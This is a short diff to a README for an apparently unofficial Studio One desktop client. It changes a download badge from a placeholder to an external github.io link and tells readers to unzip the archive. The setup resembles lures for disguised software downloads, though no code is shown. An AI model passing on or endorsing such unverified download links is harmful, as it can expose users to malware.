@@ -6,7 +6,7 @@ This unofficial Studio One desktop client brings the professional-grade music re
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://studio-one-desktop-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
